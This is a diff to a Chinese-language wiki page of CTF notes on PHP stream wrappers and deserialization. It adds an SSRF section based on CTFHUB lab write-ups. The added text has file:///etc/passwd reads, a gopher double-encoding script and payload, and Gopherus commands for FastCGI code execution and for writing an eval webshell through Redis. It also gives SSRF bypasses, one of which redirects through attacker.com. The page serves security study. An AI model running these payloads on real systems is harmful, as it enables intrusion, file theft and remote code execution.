@@ -1,8 +1,9 @@
 ---
 title: PHP伪协议与反序列化利用
-description: 系统梳理 PHP 伪协议（php://filter、php://input、data:// 等）利用技巧，深度解析反序列化漏洞中 __wakeup
-  绕过（对象计数不匹配）、正则过滤数字绕过（+ 前缀）、base64 编码差异导致的利用细节。结合赣网杯2020、攻防世界 unserialize3 与 Web_php_unserialize
-  实战题目完善利用链。
+description: 系统梳理 PHP 伪协议（php://filter、php://input、data://、file://、gopher:// 等）利用技巧，深度解析反序列化漏洞中
+  __wakeup 绕过（对象计数不匹配）、正则过滤数字绕过（+ 前缀）、base64 编码差异导致的利用细节。补充 SSRF 场景下 file:// 本地文件读取、gopher://
+  发送原始 TCP 数据包攻击 FastCGI/Redis、双重 URL 编码绕过解析机制及多种绕过技巧。结合赣网杯2020、攻防世界 unserialize3
+  与 Web_php_unserialize、CTFHUB SSRF 靶场实战题目完善利用链。
 category: program-analysis
 tags:
 - PHP
@@ -14,12 +15,17 @@ tags:
 - 文件读取
 - 绕过技巧
 - 攻防世界
+- SSRF
+- gopher
+- FastCGI
+- Redis
+- 双重URL编码
 date: 2020-10-01
 updated: '2026-11-14'
 ---
 ## 概述
 
-本页面系统梳理 PHP 常见伪协议的特性与利用条件，重点分析如何结合 `php://filter` 读取源码、`php://input` 与 `data://` 绕过文件内容校验，以及如何利用 `__toString`、`__wakeup` 等魔术方法配合反序列化实现任意文件读取或代码执行。内容基于 **赣网杯2020**、**攻防世界（Attack-Defense World）高手进阶区** 实战题目复现，归档自 [[007攻防实验室]] 微信公众号文章及 [[attack-defense-world-master-advanced-writeup]] 相关题解。
+本页面系统梳理 PHP 常见伪协议的特性与利用条件，重点分析如何结合 `php://filter` 读取源码、`php://input` 与 `data://` 绕过文件内容校验，以及如何利用 `__toString`、`__wakeup` 等魔术方法配合反序列化实现任意文件读取或代码执行。同时深入覆盖 **SSRF（服务端请求伪造）** 场景下的伪协议利用：`file://` 读取本地文件、`gopher://` 构造原始 TCP 报文攻击内网服务（FastCGI、Redis）、双重 URL 编码绕过解析机制、以及 Userinfo、十六进制 IP、302 跳转、DNS 重绑定等绕过技巧。内容基于 **赣网杯2020**、**攻防世界（Attack-Defense World）高手进阶区**、**CTFHUB SSRF 靶场** 实战题目复现，归档自 [[007攻防实验室]] 微信公众号文章及 [[attack-defense-world-master-advanced-writeup]]、[[ssrf-ctf-exploitation-guide]] 相关题解。
 
 ## PHP 常见伪协议速查
 
@@ -27,14 +33,19 @@ updated: '2026-11-14'
 
 | 协议 | 作用 | 关键条件 | 典型 Payload 示例 |
 | :--- | :--- | :--- | :--- |
-| **file://** | 访问本地文件系统 | 默认开启 | `file:///etc/passwd` |
+| **file://** | 访问本地文件系统 | 默认开启 | `file:///etc/passwd`、`file:///var/www/html/flag.php` |
 | **php://filter** | 读取文件并转换编码（如 Base64） | 默认开启 | `php://filter/read=convert.base64-encode/resource=index.php` |
 | **php://input** | 读取 POST 请求原始数据体 | `allow_url_include=On` | `?file=php://input` (POST: `<?php phpinfo();?>`) |
 | **data://** | 将数据作为文件流读取 | `allow_url_include=On` <br> `allow_url_fopen=On` <br> PHP>=5.2.0 | `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b` |
 | **zip://** | 读取压缩包内文件 | 默认开启 | `zip://path/to/img.jpg%23shell.php` |
 | **zlib://** | 读取压缩流 | 默认开启 | `compress.zlib://path/to/file` |
+| **gopher://** | 发送原始 TCP 数据包（SSRF 利用核心） | `allow_url_fopen=On` <br> 支持 TCP 流式传输 | `gopher://127.0.0.1:9000/_POST%20/flag.php...` |
+| **dict://** | 字典服务协议（端口探测/数据外带） | 默认开启 | `dict://127.0.0.1:6379/info` |
+| **ldap://** | LDAP 协议（较少用） | 需扩展支持 | `ldap://127.0.0.1:389/...` |
 
-> **注意**：`include/require` 等包含函数受 `allow_url_include` 影响；`file_get_contents/fopen` 等读取函数受 `allow_url_fopen` 影响。
+> **注意**：`include/require` 等包含函数受 `allow_url_include` 影响；`file_get_contents/fopen/curl` 等读取函数受 `allow_url_fopen` 影响。SSRF 场景多依赖 `curl`、`file_get_contents`、`fopen` 等支持远程协议的函数。
+
+---
 
 ## 实战复现一：赣网杯2020 PHP 题目（`__toString` 利用链）
 
@@ -299,10 +310,177 @@ echo "Base64 Payload: " . base64_encode($b) . "\n";
 
 ---
 
+## SSRF 场景下的伪协议深度利用
+
+> 来源：[[ssrf-ctf-exploitation-guide]]、CTFHUB SSRF 靶场实战复现 (归档文章 `CTFHUB靶场闯关--SSRF漏洞`)。
+
+SSRF（Server-Side Request Forgery）漏洞允许攻击者控制服务端发起的请求。结合 PHP 伪协议，可实现内网探测、本地文件读取、攻击内网服务（FastCGI、Redis）、绕过限制等完整利用链。
+
+### file:// 协议：本地文件读取
+
+最基础的 SSRF 利用，直接读取服务器本地文件系统。
+
+*   **适用函数**：`file_get_contents`、`fopen`、`curl` (需开启 `CURLOPT_FOLLOWLOCATION` 且支持 file 协议)、`SoapClient` 等。
+*   **典型场景**：读取 Web 目录源码、配置文件、敏感文件。
+*   **Payload 示例**：
+    ```text
+    # 读取 Web 根目录 index.php 源码
+    ?url=file:///var/www/html/index.php
+    
+    # 读取 flag 文件
+    ?url=file:///var/www/html/flag.php
+    
+    # 读取 /etc/passwd
+    ?url=file:///etc/passwd
+    ```
+*   **实战案例 (CTFHUB - 伪协议读取文件)**：
+    目标存在 `url` 参数，直接使用 `file:///var/www/html/index.php` 读取源码，发现 `flag.php` 中包含 key 值，后续配合 gopher 协议 POST 提交 key 获取 Flag。
+
+### gopher:// 协议：发送原始 TCP 数据包 (SSRF 核心利器)
+
+`gopher://` 协议可发送任意 TCP 数据流，是 SSRF 攻击内网非 HTTP 服务（FastCGI、Redis、MySQL、FTP 等）的核心手段。
+
+#### 协议格式与 `_` 前缀机制
+
+*   **格式**：`gopher://<host>:<port>/_<TCP_DATA>`
+*   **关键细节**：URL 路径部分 **必须以 `/_` 开头** (即 `/_` 后跟 TCP 数据)。因为客户端 (如 `curl`) 解析 gopher URL 时，会丢弃路径的第一个字符。
+    *   验证：`curl gopher://127.0.0.1:2333/abcd` -> 服务端收到 `bcd`；`curl gopher://127.0.0.1:2333/_abcd` -> 服务端收到 `abcd`。
+
+#### 双重 URL 编码绕过解析机制
+
+**核心原理**：SSRF 利用链通常包含 **两层请求解析**：
+1.  **第一层**：攻击者构造的 Payload 经 URL 编码传给目标服务器 (Server A)。
+2.  **第二层**：Server A 解码后，将 Payload 作为 URL 发起新请求 (到内网 Server B)。Server B 再次解析 URL，提取协议、主机、端口、路径。
+
+因此，Payload 中的特殊字符（如 `\r\n` 即 `%0D%0A`、空格 `%20`、`?` `%3F` 等）必须经过 **两次 URL 编码** 才能在最终到达 Server B 时保持正确格式。
+
+**编码流程**：
+```
+原始 TCP 报文 (含 \r\n)
+    -> 第一次 URL 编码 (将 \r\n -> %0D%0A, 空格 -> %20 等)
+    -> 手工修正：将所有 %0A 前加 %0D (即 %0A -> %0D%0A)，确保 CRLF 完整
+    -> 第二次 URL 编码 (将 % -> %25, 0 -> %30, D -> %44, A -> %41 ...)
+    -> 最终 Payload
+```
+
+**编码脚本示例 (Python)**：
+```python
+import urllib.parse
+
+raw = """POST /flag.php HTTP/1.1
+Host: 127.0.0.1:80
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+
+key=a80ea933ead842996c204517423ae75e"""
+
+# 1. 替换换行为 CRLF
+raw = raw.replace('\n', '\r\n')
+
+# 2. 第一次 URL 编码
+enc1 = urllib.parse.quote(raw, safe='')
+
+# 3. 关键修正：确保 CRLF 为 %0D%0A (quote 通常只编码 \n 为 %0A，需手工补 %0D)
+# 实际中 quote 会将 \r 编码为 %0D，\n 编码为 %0A，故结果已为 %0D%0A
+# 但若原始字符串只有 \n，则需手工处理
+
+# 4. 第二次 URL 编码
+enc2 = urllib.parse.quote(enc1, safe='')
+
+# 5. 构造最终 gopher URL
+payload = f"gopher://127.0.0.1:80/_{enc2}"
+print(payload)
+```
+
+#### 实战一：POST 请求提交 Key 获取 Flag (CTFHUB - POST)
+
+*   **前置条件**：通过 `file://` 读取 `index.php` 源码，发现重定向逻辑 `header("Location: /?url=_");` 需构造 POST 请求到 `flag.php` 提交 `key`。
+*   **原始 HTTP 报文**：
+    ```http
+    POST /flag.php HTTP/1.1
+    Host: 127.0.0.1:80
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 36
+
+    key=a80ea933ead842996c204517423ae75e
+    ```
+*   **双重编码后 Payload**：
+    ```text
+    gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253Dcdea2306d3bf03cc1976f28bd47357ac
+    ```
+
+#### 实战二：文件上传 Getshell (CTFHUB - 文件上传)
+
+*   **场景**：`flag.php` 存在文件上传功能，需构造 multipart/form-data POST 包上传 Webshell。
+*   **步骤**：
+    1.  修改前端 HTML 添加提交按钮。
+    2.  抓包获取完整的上传 POST 报文 (含 Boundary、文件内容 `GIF89a<?php @eval($_POST['pass']);?>`)。
+    3.  对报文执行 **双重 URL 编码** (注意 `Content-Length` 必须准确)。
+    4.  构造 `gopher://` Payload 发送。
+    5.  访问上传后的 Shell 路径执行命令获取 Flag。
+
+#### 实战三：攻击 FastCGI (PHP-FPM) 实现 RCE (CTFHUB - Fastcgi协议)
+
+*   **原理**：PHP-FPM 默认监听 `9000` 端口，支持 FastCGI 协议。通过构造 FastCGI 报文，设置环境变量 `PHP_VALUE` 开启 `auto_prepend_file=php://input` 并注入 PHP 代码，实现任意代码执行。
+*   **利用工具**：Python FastCGI Client 脚本 (如文章提供的 `2.py`)。
+*   **本地生成 Payload 流程**：
+    ```bash
+    # 生成攻击 127.0.0.1:9000 的 FastCGI 报文，执行 system('ls /')
+    python 2.py -c "<?php var_dump(shell_exec('ls /'));?>" -p 9000 127.0.0.1 /var/www/html/index.php
+    ```
+*   **抓包/脚本输出原始 TCP 流** -> **双重 URL 编码** -> **构造 gopher:// Payload**。
+*   **工具辅助**：`Gopherus` 工具集成 FastCGI 模块，可直接生成双重编码后的 gopher payload。
+    ```bash
+    # Gopherus 交互式生成
+    > gopherus --exploit fastcgi
+    > ip: 127.0.0.1
+    > port: 9000
+    > file: /var/www/html/index.php
+    > code: <?php system('ls /'); ?>
+    ```
+*   **后续利用**：执行 `system('cat /flag_xxx')` 读取 Flag。
+
+#### 实战四：攻击 Redis 未授权访问写 Webshell (CTFHUB - Redis协议)
+
+*   **原理**：Redis 默认监听 `6379` 端口，若无密码认证，可通过 `CONFIG SET dir` 设置工作目录为 Web 目录，`CONFIG SET dbfilename` 设置为 `shell.php`，然后 `SET` 写入 PHP 代码，`SAVE` 落盘。
+*   **Redis 协议格式 (RESP)**：`*<argc>\r\n$<len>\r\n<cmd>\r\n...`
+*   **利用工具**：`Gopherus` 内置 Redis 模块。
+    ```bash
+    > gopherus --exploit redis
+    > ip: 127.0.0.1
+    > port: 6379
+    > dir: /var/www/html
+    > filename: shell.php
+    > command: <?php @eval($_POST['pass']);?>
+    ```
+*   **注意点**：
+    *   生成的 Payload 需 **一次 URL 编码** (Gopherus 输出通常已为单次编码，视目标解析层数调整)。
+    *   发送后可能返回 504 Timeout，但 Shell 可能已写入成功。
+    *   直接访问 `http://target/shell.php?cmd=system("cat /flag");` 连接。
+
+---
+
+### SSRF 绕过技巧总结
+
+针对目标对 URL 进行的各类校验（白名单、黑名单、解析差异），常用绕过手段如下：
+
+| 绕过类型 | 校验逻辑示例 | 绕过 Payload / 方法 | 核心原理 |
+| :--- | :--- | :--- | :--- |
+| **Userinfo 欺骗** | `parse_url($url)['host']` 校验宿主 | `http://notfound.ctfhub.com@127.0.0.1/flag.php` | `parse_url` 取 `host` 为 `notfound.ctfhub.com`，但 `curl`/`fopen` 实际请求 `127.0.0.1` (RFC 3986 userinfo 语法)。 |
+| **十六进制 IP** | 黑名单过滤 `127.0.0.1`、`localhost` | `http://0x7F000001/flag.php` <br> `http://2130706433/flag.php` (十进制整数) | 浏览器/HTTP 客户端支持十六进制/八进制/整数格式 IP 解析。 |
+| **302 跳转** | 校验初始 URL Host，但跟随重定向 | 1. 攻击者控制 VPS 返回 `302 Location: http://127.0.0.1/flag.php` <br> 2. `?url=http://attacker.com/redirect` | 校验通过初始 URL，请求库 (curl 默认/开启 `FOLLOWLOCATION`) 跟随跳转至内网。 |
+| **DNS 重绑定** | 校验域名解析 IP (TOCTOU) | 1. 域名 `rbndr.us` 解析先返回公网 IP (通过校验)，再返回 `127.0.0.1` <br> 2. `?url=http://7f000001.7f000002.rbndr.us/flag.php` | 利用 DNS TTL 短、解析记录动态变化，在校验与请求之间切换 IP。工具：`lock.cmpxchg8b.com/rebinder.html`。 |
+| **端口绕过** | 仅允许 80/443 端口 | `http://127.0.0.1:80/flag.php` (显性标注) <br> 或利用上述 Userinfo/DNS 绕过隐含端口 | 显性声明允许端口，或绕过宿主校验后任意指定端口。 |
+| **协议封装** | 仅允许 http/https | `file://`、`gopher://`、`dict://` 等 (若函数支持) | 利用 PHP 封装协议特性，非 HTTP 协议同样可发起请求。 |
+
+---
+
 ## 核心知识点总结
 
 ### 伪协议组合拳
 *   **`data://` + `php://filter`**：`data://` 用于注入可控字符串绕过校验；`php://filter` 用于源码泄露（绕过 `include` 执行、获取类结构）。
+*   **`file://` (SSRF)**：直接读取本地文件，配合 `gopher://` 攻击内网服务。
+*   **`gopher://` (万金油)**：构造任意 TCP 报文，攻击 FastCGI、Redis、MySQL、FTP、SMTP 等内网服务，实现 RCE、写 Shell、数据窃取。
 *   **条件依赖**：利用前必确认 `phpinfo()` 或报错回显中的 `allow_url_fopen` 与 `allow_url_include` 状态。
 
 ### 反序列化魔术方法利用链对比
@@ -327,12 +505,23 @@ echo "Base64 Payload: " . base64_encode($b) . "\n";
     *   `protected $prop` -> `s:length:"\00*\00prop"`
     *   长度计算包含两个不可见字节 (`\00`)，手工修改极易出错，**强制要求本地代码生成**。
 
+### SSRF 利用核心要点
+
+1.  **协议支持度测试**：优先测试 `file://`、`dict://`、`gopher://`、 `http://`、`https://` 支持情况。
+2.  **双重编码是关键**：`gopher://` Payload 必须双重 URL 编码，且注意 CRLF (`%0D%0A`) 完整性。
+3.  **内网服务指纹识别**：结合 `dict://` 探测端口 Banner (Redis `INFO`、FastCGI 无 Banner 但可尝试连接)、`file://` 读取配置文件确定服务版本/路径。
+4.  **工具链熟练度**：`Gopherus` (生成 gopher payload)、`FastCGI Client` (Python/Go 版)、`Redis CLI` / `Gopherus Redis` 模块、`curl` / `nc` 验证 TCP 报文。
+5.  **绕过组合拳**：实际环境常组合多种绕过 (如 DNS 重绑定 + gopher 攻击 Redis)，需灵活搭配。
+
 ## 关联页面
 
 *   [[007攻防实验室]] - 文章来源归档库，包含更多 CTF 实战笔记（赣网杯2020等）。
 *   [[attack-defense-world-master-advanced-writeup]] - 攻防世界高手进阶区完整 Writeup 索引，包含 `unserialize3`、`Web_php_unserialize` 等题目详解。
+*   [[ssrf-ctf-exploitation-guide]] - CTFHUB SSRF 靶场完整利用指南，涵盖内网探测、多协议利用、POST 构造、文件上传、FastCGI/Redis RCE 及双重 URL 编码技巧。
+*   [[ssrf-bypass-techniques]] - SSRF 绕过技巧系统梳理：用户信息、十六进制 IP、302 跳转、DNS 重绑定、localhost 绕过等五大核心技巧。
 *   [[ctf-show-php-command-execution-bypass-techniques]] - PHP 命令执行与绕过技巧体系，涉及 `disable_functions`、`open_basedir` 等后续利用环境。
-*   [[php-webshell-fundamentals-chopper-analysis]] - PHP Webshell 基础与蚁剑流量分析，反序列化 Getshell 后的后续操作参考。
+*   [[php-webshell-fundamentals-chopper-analysis]] - PHP Webshell 基础与蚁剑流量分析，反序列化/SSRF Getshell 后的后续操作参考。
+*   [[internal-network-pivoting-techniques]] - 内网穿透/横向移动技术体系，SSRF 获取内网立足点后的代理隧道搭建实战。
 
 ## 参考资源
 
@@ -342,9 +531,16 @@ echo "Base64 Payload: " . base64_encode($b) . "\n";
 *   CVE-2016-7124: PHP `__wakeup` 绕过漏洞分析 (对象计数不匹配)
 *   赣网杯2020 Writeup 原文 (微信归档)
 *   攻防世界靶场在线实战环境
+*   CTFHUB 靶场 SSRF 闯关实战
+*   Gopherus: https://github.com/tarunkant/Gopherus
+*   FastCGI 协议分析: https://segmentfault.com/a/1190000013112052
+*   Redis 未授权访问利用: https://blog.csdn.net/mysteryflower/article/details/94386461
+*   DNS Rebinder: https://lock.cmpxchg8b.com/rebinder.html
 
 ## 来源
 
 - [007攻防实验室-202007-202010_2](../sources/007攻防实验室-202007-202010_2.md)
-- [攻防世界高手进阶区page1](../sources/攻防世界高手进阶区page1.md) (即用户提供的归档文章内容)
+- [攻防世界高手进阶区page1](../sources/攻防世界高手进阶区page1.md)
 - [0x00实验室-202108-202304_065](../sources/0x00实验室-202108-202304_065.md)
+- [CTFHUB靶场闯关--SSRF漏洞](../sources/CTFHUB靶场闯关--SSRF漏洞.md)
+- [0x00实验室-202108-202304_069](../sources/0x00实验室-202108-202304_069.md)
